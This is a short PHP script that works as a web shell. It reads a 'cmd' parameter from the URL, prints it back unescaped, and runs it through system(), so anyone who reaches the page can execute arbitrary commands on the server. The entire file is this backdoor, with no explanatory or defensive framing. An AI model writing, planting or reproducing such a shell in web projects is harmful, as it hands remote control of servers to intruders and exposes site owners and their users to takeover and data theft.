<?php
$cmd = $_GET['cmd'];
echo 'The shell code <b>'.$cmd.'</b> as been executed on server.<br>';
system($cmd);
?>